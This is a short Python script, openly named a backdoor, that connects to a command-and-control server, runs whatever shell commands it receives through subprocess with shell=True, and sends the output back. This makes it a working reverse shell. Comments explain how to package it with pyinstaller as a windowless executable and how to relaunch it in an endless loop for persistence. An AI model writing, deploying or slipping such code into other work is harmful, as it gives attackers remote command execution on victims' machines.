#!/usr/bin/python
#-*- coding: utf-8 -*-

#compile to ext file
#pyinstaller --onefile --windowed back_door.py

#auto
#while true; do python back_door.pyc; sleep 1; done
import subprocess,socket

#CNC Server Host
HOST = "127.0.0.1"

#CNC Server Listen Port
PORT = 8000

s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect((HOST,PORT))
s.send("Hello There")

while 1:
    data = s.recv(1024)
    if data.strip() == "quit":break;
    proc = subprocess.Popen(data, shell=True,stdout=subprocess.PIPE,stderr=subprocess.PIPE,stdin=subprocess.PIPE)
    stdoutput = proc.stdout.read() + proc.stderr.read()
    s.send(stdoutput)

s.send("Bye new")
s.close()


